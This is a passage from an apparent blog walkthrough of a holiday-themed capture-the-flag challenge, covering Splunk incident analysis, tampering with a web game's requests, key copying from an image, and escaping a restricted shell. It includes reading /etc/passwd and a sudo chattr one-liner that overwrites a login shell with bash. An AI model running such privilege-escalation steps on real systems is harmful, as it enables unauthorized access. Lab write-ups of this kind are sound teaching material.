5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>PS /home/elf&gt; (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
HTTP/1.0 200 OK                                                                                   
Server: Werkzeug/0.16.0                                                                           
Server: Python/3.6.9                                                                              
Date: Sat, 11 Jan 2020 05:09:18 GMT                                                               
Content-Type: text/html; charset=utf-8
Content-Length: 860

&lt;html&gt;
&lt;body&gt;
&lt;pre&gt;
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&amp;H=5&amp;He=5&amp;N=5&amp;Ne=20&amp;Ar=10&amp;Xe=10&amp;F=20&amp;Kr=10&amp;Rn=10
----------------------------------------------------
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><h5 id="parameter-angle"><span class="mr-2">Parameter Angle:</span><a href="#parameter-angle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5></h5><p>Found in Riddle 1<br /> Command is (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent</p><h5 id="parameter-refraction"><span class="mr-2">Parameter Refraction:</span><a href="#parameter-refraction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5></h5><p>Found in Riddle 3<br /> refraction?val=1.867<br /> Command is (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent</p><h5 id="parameter-temperature"><span class="mr-2">Parameter Temperature:</span><a href="#parameter-temperature" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5></h5><p>Found in Riddle 4<br /> temperature?val=-33.5<br /> Command is (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent</p><h5 id="parameter-gases"><span class="mr-2">Parameter Gases:</span><a href="#parameter-gases" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5></h5><p>Found in Riddle 7<br /> powershell.exe -c “`$correct_gases_postbody = @{ O=6 H=7 He=3 N=4 Ne=22 Ar=11 Xe=10 F=20 Kr=8 Rn=9}” Command is <code class="language-plaintext highlighter-rouge">(Invoke-WebRequest -Uri “http://127.0.0.1:1225/api/gas?val=65.5” -Method POST -Body “O=6&amp;H=7&amp;He=3&amp;N=4&amp;Ne=22&amp;Ar=11&amp;Xe=10&amp;F=20&amp;Kr=8&amp;Rn=9”).RawContent</code></p><p>After inputting those API commands, check the output with “/api/output” to complete the challenge.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>PS /home/elf&gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent        
HTTP/1.0 200 OK                                                                                   
Server: Werkzeug/0.16.0                                                                           
Server: Python/3.6.9                                                                              
Date: Sat, 11 Jan 2020 05:25:25 GMT                                                               
Content-Type: text/html; charset=utf-8
Content-Length: 200

Success! - 6.76 Mega-Jollies of Laser Output Reached!
</pre></table></code></div></div><p>The hint that Sparkle Redberry gives after completing the challenge is:</p><blockquote class="wp-block-quote"><p> You got it &#8211; three cheers for cheer!<br />For objective 5, have you taken a look at our Zeek logs? <br />Something&#8217;s gone wrong. But I hear someone named Rita can help us. <br />Can you and she figure out what happened?</p><cite>Sparkle Redberry</cite></blockquote><h3 id="solution-2"><span class="mr-2">Solution</span><a href="#solution-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The hint refers to the analysis software RITA. It didn’t install on my Kali box for some reason, so I downloaded a virtual machine for Blue Team operations called “SecurityOnion”, where RITA comes installed. After much struggling trying to get RITA to complete the analysis I finally figured out that in the “elfu-zeeklogs” download, there was a pre-generated RITA report!! What a waste of time getting it to run the analysis myself, probably a whole day’s worth.</p><p>If you go to “elfu-zeeklogs/ELFU/index.html” you’ll see the report. Pretty much the only thing that’s useful is the “Beacons” tab found at the top. Suspicious connections have high counts and should be at the top of the list.</p><p>Since the Objective is to find the IP address of the malware-infected system, get the source address for the top result and submit it as the answer.</p><p>You can now speak to Santa again and get more dialogue to unlock more Objectives.</p><blockquote class="wp-block-quote"><p> Thank you for finding Jane and Michael, our two turtle doves!<br />I’ve got an uneasy feeling about how they disappeared.<br />Turtle doves wouldn’t wander off like that.<br />Someone must have stolen them! Please help us find the thief!<br />It’s a moral imperative!<br />I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!<br />Gosh, I can’t help but think:<br />Winds in the East, snow coming in…<br />Like something is brewing and about to begin!<br />Can’t put my finger on what lies in store,<br />But I fear what’s to happen all happened before!</p><cite>Santa</cite></blockquote><h2 id="objective-6--splunk"><span class="mr-2">Objective 6 – Splunk</span><a href="#objective-6--splunk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Access <a href="https://splunk.elfu.org/">https://splunk.elfu.org/</a> as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! _For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: &#8220;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&#8221;</p></blockquote><p>This Objective is all about analyzing event log data with a Splunk App the ElfU SOC made. The Objective text directs you to Professor Banas for a hint but he really doesn’t give you any. He just ties in the storyline to visit the Splunk App.</p><blockquote class="wp-block-quote"><p> Hi, I&#8217;m Dr. Banas, professor of Cheerology at Elf University.<br />This term, I&#8217;m teaching &#8220;HOL 404: The Search for Holiday Cheer in Popular Culture,&#8221; and I&#8217;ve had quite a shock!<br />I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.<br />Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP!<br />If I don&#8217;t, he will have to report the incident to the boss of the SOC.<br />Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks.<br />I don&#8217;t know anything about computer security. Can you please help me?</p><cite>Professor Banas</cite></blockquote><p>When you visit the Splunk site given, you’ll see a chat app with several elf members of the ELFU Security Operations Center. Since Prof Banas said to talk to Kent, click on his name on the left and see what chat text is available. Ultimately, the goal of the Splunk Objective is to find the message left for Kent in the event log.</p><p><a href="/assets/img/2020/01/image-8.png"><img data-src="/assets/img/2020/01/image-8-1024x941.png" data-proofer-ignore></a></p><p>If you go through the chats that are available, you’ll get to talk to Alice Bluebird, who guides you through completing the training questions to the right side of the screen. By the time you finish the training questions you should be able to use what you’ve learned to figure out what the message for Kent is. Use the Search tab at the top of the page to analyze the event log data to get the answers.</p><h3 id="training-question-1"><span class="mr-2">Training Question 1</span><a href="#training-question-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the short host name of Professor Banas’ computer?</p><h4 id="answer--sweetums"><span class="mr-2">Answer – <strong>sweetums</strong></span><a href="#answer--sweetums" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>This is found in the chat with #ELFU SOC.</p><h3 id="training-question-2"><span class="mr-2">Training Question 2</span><a href="#training-question-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)</p><h4 id="answer--cuserscbanasdocumentsnaughty_and_nice_2019_drafttxt"><span class="mr-2">Answer – C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</span><a href="#answer--cuserscbanasdocumentsnaughty_and_nice_2019_drafttxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>This is found by searching for “Santa”</p><h3 id="training-question-3"><span class="mr-2">Training Question 3</span><a href="#training-question-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)</p><h4 id="answer--14420246214vultrcom"><span class="mr-2">Answer – 144.202.46.214.vultr.com</span><a href="#answer--14420246214vultrcom" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>To find the answer, search:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 powershell
</pre></table></code></div></div><p>Then look at the Interesting Field “dest_host” on the left of the page.</p><h3 id="training-question-4"><span class="mr-2">Training Question 4</span><a href="#training-question-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)</p><h4 id="answer--19th-century-holiday-cheer-assignmentdocm"><span class="mr-2">Answer – 19th Century Holiday Cheer Assignment.docm</span><a href="#answer--19th-century-holiday-cheer-assignmentdocm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Follow Alice Bluebird’s instructions by first searching for:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational" | reverse
</pre></table></code></div></div><p>Then follow her instructions to pivot on time:</p><blockquote class="wp-block-quote"><p> Look at the&nbsp;<strong>Time</strong>&nbsp;column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. Accept the default of +/- five seconds and click apply. Then remove the&nbsp;<strong>sourcetype</strong>&nbsp;search term and also remove the &#8216;<strong>| reverse</strong>&#8216; and re-run the search.</p></blockquote><p>Instead of 5 seconds, select a time window of 1 minute and look at all the events. Alice Bluebird will tell you to search for Process ID’s, but I couldn’t find anything using that method. In the area where “interesting fields” are displayed, click “All Fields” and look at the field “Process_Command_Line”. You’ll see several commands, and one of them inclues a document that is loaded by Microsoft Word, that is the answer.</p><h3 id="training-question-5"><span class="mr-2">Training Question 5</span><a href="#training-question-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)</p><h4 id="answer--21"><span class="mr-2">Answer – 21</span><a href="#answer--21" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>First, search on “Holiday Cheer”, making sure you’re looking at the entire time range.<br /> Then look at the “results{}.workers.smtp.subject” field that’s associated with emails.<br /> There are 21 emails that are related to the “Holiday Cheer Assignment Submission”</p><p><a href="/assets/img/2020/01/image-9.png"><img data-src="/assets/img/2020/01/image-9-1024x940.png" data-proofer-ignore></a></p><h3 id="training-question-6"><span class="mr-2">Training Question 6</span><a href="#training-question-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What was the password for the zip archive that contained the suspicious file?</p><h4 id="answer--123456789"><span class="mr-2">Answer – 123456789</span><a href="#answer--123456789" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Search for the suspicious filename, which is “19th Century Holiday Cheer Assignment.docm”.<br /> Then go to the stoq event and open the dropdown pluses for the first result -&gt; workers -&gt; smtp.<br /> There you’ll see the email body which contains the password.</p><p><a href="/assets/img/2020/01/image-10.png"><img data-src="/assets/img/2020/01/image-10-1024x940.png" data-proofer-ignore></a></p><h3 id="training-question-7"><span class="mr-2">Training Question 7</span><a href="#training-question-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What email address did the suspicious file come from?</p><h4 id="answer--bradlybuttercupseifuorg"><span class="mr-2">Answer – Bradly.Buttercups@eIfu.org</span><a href="#answer--bradlybuttercupseifuorg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Using the same event from the previous question, look at the “from” field. Notice the from address domain is “eIfu.org” using a capital “i”.</p><h3 id="challenge-question"><span class="mr-2">Challenge Question</span><a href="#challenge-question" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>What was the message for Kent that the adversary embedded in this attack?</p><p>Alice Bluebird provides you with link to the event you need to look through and a link to the file archive. To solve the challenge question you have to search through the “results” for any suspicious files and open them from the file archive. It is best to craft an spath command and Alice gives an example of what that looks like.</p><p>Here is the spath command that will show a list of all the files involved with the event. You can open them up one by one by copying the path and pasting in the address bar of the file archive.</p><p><a href="/assets/img/2020/01/image-11.png"><img data-src="/assets/img/2020/01/image-11-1024x150.png" data-proofer-ignore></a></p><p>After traveling to the file path, you will have to go up a directory or two until you’re able to see the file download link. After downloading the file you want, just open it in a text editor to see if you have something interesting. The file with the answer is “core.xml”.</p><h2 id="objective-7--get-access-to-the-steam-tunnels"><span class="mr-2">Objective 7 – Get Access to the Steam Tunnels</span><a href="#objective-7--get-access-to-the-steam-tunnels" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. _For hints on achieving this objective, please visit Minty’s dorm room and talk with Minty Candy Cane.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: Krampus Hollyfeld</p></blockquote><p>This Objective requires some exploration. You’ll have to get into the locked closet inside of Minty Candycane’s dorm room.</p><h3 id="dorm-pinpad"><span class="mr-2">Dorm PinPad</span><a href="#dorm-pinpad" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The first thing to do is get access to the Dorm area by cracking the pinpad code that’s at the right hand side of the Quad.</p><p>You can get a hint from the elf near it, Tangle Coalbox. He says:</p><blockquote class="wp-block-quote"><p> Hey kid, it&#8217;s me, Tangle Coalbox.<br />I&#8217;m sleuthing again, and I could use your help.<br />Ya see, this here number lock&#8217;s been popped by someone.<br />I think I know who, but it&#8217;d sure be great if you could open this up for me.<br />I&#8217;ve got a few clues for you.<br />1. One digit is repeated once.<br />2. The code is a prime number.<br />3. You can probably tell by looking at the keypad which buttons are used.</p><cite>Tangle Coalbox</cite></blockquote><p>On the keypad, you can see three numbers that are used because there is less frost on them.</p><p><a href="/assets/img/2020/01/image-13.png"><img data-src="/assets/img/2020/01/image-13.png" data-proofer-ignore></a></p><p>Tangle said one of the numbers is repeated, and the code is a prime number.</p><p>After a few tries you should be able to crack it.</p><blockquote class="wp-block-quote"><p> Answer &#8211; 7331</p></blockquote><h3 id="terminal-challenge--holiday-hack-trail"><span class="mr-2">Terminal Challenge – Holiday Hack Trail</span><a href="#terminal-challenge--holiday-hack-trail" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Minty Candycane gives a hint to get into the closet in her room, but first you have to hack the game in her terminal challenge.</p><p>The tool I prefer for this job is BurpSuite, but you could use another HTTP filter proxy or browser addon that can modify headers and data.</p><p>Start the game and play around to see how it works, while watching the requests in Burp.</p><h4 id="easy-mode"><span class="mr-2">Easy Mode</span><a href="#easy-mode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>To solve Easy Mode, you can modify variables in the url at the top of the game screen after you’re out of the store. One way to do it is modify “distance” to 8000 then press “GO”.</p><p><img data-src="/assets/img/2020/01/image-14.png" data-proofer-ignore></p><h4 id="medium-mode"><span class="mr-2">Medium Mode</span><a href="#medium-mode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>In the Medium Mode, all of the variables were moved from the URL into POST data, which you can see in Burp. Use the Repeater tab to modify a variable, then press Send.</p><p><a href="/assets/img/2020/01/image-16.png"><img data-src="/assets/img/2020/01/image-16-1024x803.png" data-proofer-ignore></a></p><h4 id="hard-mode"><span class="mr-2">Hard Mode</span><a href="#hard-mode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>In the POST variables on Hard mode, there is a “hash” value that has to be right or the game will give an error.</p><p><a href="/assets/img/2020/01/image-17.png"><img data-src="/assets/img/2020/01/image-17-1024x803.png" data-proofer-ignore></a></p><p>For a strong clue, watch the talk <a href="http://www.youtube.com/watch?v=0T6-DQtzCgM">Web Apps: A Trailhead</a>. The algorithm is leaked about mid-way through the video. Not everything is seen perfectly, but you can sort out that the hash is adding the numeric values of variables together in a string and running “md5it” to get it’s md5 hash value. To find out exactly which variables are being put together simply change values and see which ones cause errors.</p><p><a href="/assets/img/2020/01/image-18.png"><img data-src="/assets/img/2020/01/image-18-1024x578.png" data-proofer-ignore></a></p><p>The variables used are:<br /> money<br /> distance<br /> curday<br /> curmonth<br /> reindeer<br /> runners<br /> ammo<br /> meds<br /> food</p><p>Add the values together that you want to send and use an online MD5 generator to get the hash value.</p><p><a href="/assets/img/2020/01/image-19.png"><img data-src="/assets/img/2020/01/image-19-1024x803.png" data-proofer-ignore></a></p><h3 id="hint"><span class="mr-2">Hint</span><a href="#hint" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> You made it &#8211; congrats!<br />Have you played with the key grinder in my room? Check it out!<br />It turns out: if you have a good image of a key, you can physically copy it.<br />Maybe you&#8217;ll see someone hopping around with a key here on campus.<br />Sometimes you can find it in the Network tab of the browser console.<br />Deviant has a great talk on it at this year&#8217;s Con.<br />He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.</p><cite>Minty Candycane</cite></blockquote><p>The hint Minty gives is regarding a key making machine in her room. And mentions looking for a person with a key by monitoring the Network tab in the browser’s developer tools.</p><p>When you walk into her room, you’ll see a guy hurry into the closet and shut the door behind him. And if your Network tab is open, it will record the download for his image file. The guy’s name is Krampus, and the key is very clearly visible.</p><p><img data-src="/assets/img/2020/01/image-20-463x1024.png" data-proofer-ignore></p><p>In the room, there is a key grinder on the desk that allows you to click on it and make a key. Click the key to download an image of it.</p><p><a href="/assets/img/2020/01/image-21.png"><img data-src="/assets/img/2020/01/image-21.png" data-proofer-ignore></a></p><p>When you go into the closet you see a keyhole on the back wall that you can click on. It will open a closeup view of the lock with a group of keys hanging up. Click on the keys to load your own key image that was saved from the grinder.</p><p><a href="/assets/img/2020/01/image-22.png"><img data-src="/assets/img/2020/01/image-22-1024x757.png" data-proofer-ignore></a></p><p>There is a talk that will help figure out the key’s biting code called “<a href="http://www.youtube.com/watch?v=KU6FJnbkeLA">Optical Decoding of Keys</a>“. It has some general info about the issue, and after watching that talk you should be able to figure out the code on Krampus’s key by looking closely at the picture and guessing the values. Then input your guess into the key grinder to save your own copy of the key to use in the secret door.</p><blockquote class="wp-block-quote is-style-large"><p> Answer: 122520</p></blockquote><h3 id="steam-tunnels"><span class="mr-2">Steam Tunnels</span><a href="#steam-tunnels" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Opening the secret door at the back of the closet goes to the steam tunnels. Walk through the tunnel to the end to meet and talk to Krampus. Here you find out that he was actually the one who took the Turtle Doves!</p><blockquote class="wp-block-quote"><p> Hello there! I’m Krampus Hollyfeld.<br />I maintain the steam tunnels underneath Elf U,<br />Keeping all the elves warm and jolly.<br />Though I spend my time in the tunnels and smoke,<br />In this whole wide world, there&#8217;s no happier bloke!<br />Yes, I borrowed Santa’s turtle doves for just a bit.<br />Someone left some scraps of paper near that fireplace, which is a big fire hazard.<br />I sent the turtle doves to fetch the paper scraps.<br />But, before I can tell you more, I need to know that I can trust you.<br />Tell you what – if you can help me beat the <a href="https://fridosleigh.com/">Frido Sleigh</a> contest (Objective 8), then I&#8217;ll know I can trust you.<br />The contest is here on my screen and at <a href="https://fridosleigh.com/">fridosleigh.com</a>.<br />No purchase necessary, enter as often as you want, so I am!<br />They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.<br />Unfortunately, it&#8217;s restricted to elves only, and I can&#8217;t bypass the CAPTEHA.<br />(That&#8217;s Completely Automated Public Turing test to tell Elves and Humans Apart.)<br />I&#8217;ve already cataloged <a href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a> and decoded the <a href="https://downloads.elfu.org/capteha_api.py">API interface</a>.<br />Can you help me bypass the CAPTEHA and submit lots of entries?</p><cite>Krampus Hollyfeld</cite></blockquote><p>Solving this Objective unlocks the rest of the Objectives, and you’ll get a new tab to your badge that allows you to fast travel through the steam tunnels.</p><p><a href="/assets/img/2020/01/image-23.png"><img data-src="/assets/img/2020/01/image-23.png" data-proofer-ignore></a></p><h2 id="objective-8--bypassing-the-frido-sleigh-capteha"><span class="mr-2">Objective 8 – Bypassing the Frido Sleigh CAPTEHA</span><a href="#objective-8--bypassing-the-frido-sleigh-capteha" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Help Krampus beat the <a href="https://fridosleigh.com/">Frido Sleigh contest</a>. _For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: 8Ia8LiZEwvyZr2WO</p></blockquote><p>This Objective was given by Krampus to help him win the <a href="https://fridosleigh.com/">Frido Sleigh</a> competition by circumventing the custom captcha system called CAPTEHA ( Completely Automated Public Turing test to tell Elves and Humans Apart). Krampus provides some code to start with that uses an <a href="https://downloads.elfu.org/capteha_api.py">API interface</a> to the competition. He also provides <a href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a> he’s saved to use with a machine learning algorithm for the solution.</p><p><a href="/assets/img/2020/01/image-24.png"><img data-src="/assets/img/2020/01/image-24.png" data-proofer-ignore></a></p><p>When you fill in the info fields and check the CAPTEHA box it presents the challenge image and gives you only 5 seconds to complete it or else it determines you’re not an elf and exits.</p><p><a href="/assets/img/2020/01/image-25.png"><img data-src="/assets/img/2020/01/image-25-1024x940.png" data-proofer-ignore></a></p><p>To inspect this screen a little closer, you can use the Developer Tools Console in your browser, and enter this code to change the timeout value:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$('#timer').text('9000')
</pre></table></code></div></div><p>Even with the timer set to something ridiculous, you can select all the proper images, but still not be able to pass the challenge.</p><p>To get a hint on how to use machine learning to break the CAPTEHA, talk to Alabaster Snowball in the Speaker Unpreparedness Room, which is in the Hermey Hall area of campus.</p><h3 id="terminal-challenge--nyanshell"><span class="mr-2">Terminal Challenge – Nyanshell</span><a href="#terminal-challenge--nyanshell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Welcome to the Speaker UNpreparedness Room!<br />My name&#8217;s Alabaster Snowball and I could use a hand.<br />I&#8217;m trying to log into this terminal, but something&#8217;s gone horribly wrong.<br />Every time I try to log in, I get accosted with … a hatted cat and a toaster pastry?<br />I thought my shell was Bash, not flying feline.<br />When I try to overwrite it with something else, I get permission errors.<br />Have you heard any chatter about immutable files? And what is sudo -l telling me?</p><cite>Alabaster Snowball</cite></blockquote><p>Help Alabaster break out of the limited shell in the terminal challenge. The banner text says to log into a bash shell as “alabaster_snowball”.</p><p>When trying to use the command “su” to get into alabaster’s account, you will be greated with a holiday nyancat!</p><p><a href="/assets/img/2020/01/image-26.png"><img data-src="/assets/img/2020/01/image-26.png" data-proofer-ignore></a></p><p>Dumping “/etc/passwd” shows that alabaster’s shell is set to “/bin/nsh”.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>elf@2e974b2f04ac:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/bash
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
</pre></table></code></div></div><p>If you try to use “chsh” to change alabaster’s shell the normal way if fails for some reason. So we have to replace “nsh” with “bash” to get the right shell in place.</p><p>Alabaster gives a hint about immutable files when talking to him, and “nsh” is indeed one of them. To verify, use the command <code class="language-plaintext highlighter-rouge">lsattr /bin/nsh</code>. However, upon Alabaster’s other hint about <code class="language-plaintext highlighter-rouge">sudo -l</code>, you’ll see that you have access to <code class="language-plaintext highlighter-rouge">chattr</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>elf@2e974b2f04ac:~$ sudo -l
Matching Defaults entries for elf on 2e974b2f04ac:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on 2e974b2f04ac:
    (root) NOPASSWD: /usr/bin/chattr
</pre></table></code></div></div><p>Use <code class="language-plaintext highlighter-rouge">chattr</code> to modify <code class="language-plaintext highlighter-rouge">nsh</code>, and then copy bash into it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo chattr -i /bin/nsh; cp /bin/bash /bin/nsh
</pre></table></code></div></div><p>Use <code class="language-plaintext highlighter-rouge">su</code> to log in as alabaster_snowball and you’ll beat the challenge.</p><h3 id="hint-1"><span class="mr-2">Hint</span><a href="#hint-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote is-style-default"><p> Who would do such a thing?? Well, it IS a good looking cat.<br /> Have you heard about the Frido Sleigh contest?<br /> There are some serious prizes up for grabs.<br /> The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter.<br /> I heard there was a talk at KCII about using machine learning to defeat challenges like this.<br /> I don&#8217;t think anything could ever beat an elf though!</p><cite>Alabaster Snowball</cite></blockquote><p>You’ll get a Hint in your badge from Alabaster called “Machine Learning” that gives a link to a talk <a href="https://youtu.be/jmVPLwjm_zs">Machine Learning Use Cases for Cyber Security</a> In the video you’ll see the URL to some <a href="https://github.com/chrisjd20/img_rec_tf_ml_demo">demo code</a> to that helps to use ML with TensorFlow. It provides a script that trains a model with given images and also code to run against the model.</p><h3 id="solution-3"><span class="mr-2">Solution</span><a href="#solution-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The “capteha_api” code that Krampus provides has a section in the middle that says “MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE”. TensorFlow code can go there, however after I got the code working it would not complete fast enough to pass the challenge. It would instead return with a “Timed Out” error.</p><p>That seemed to be a lot of people’s hang up with this Objective. There are probably many ways to fix that, but my way was to rearrange the code from the TensorFlow demo.</p><p>The idea is to do as much of the processing as possible BEFORE creating the web session to Frido Sleigh. There seemed to be a long pause at the start of loading the model before any checking occured. So put the code that loads the TensorFlow model and session above the “requests.Session()” call and image checking loop.</p><p>The main() function could look something like this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table 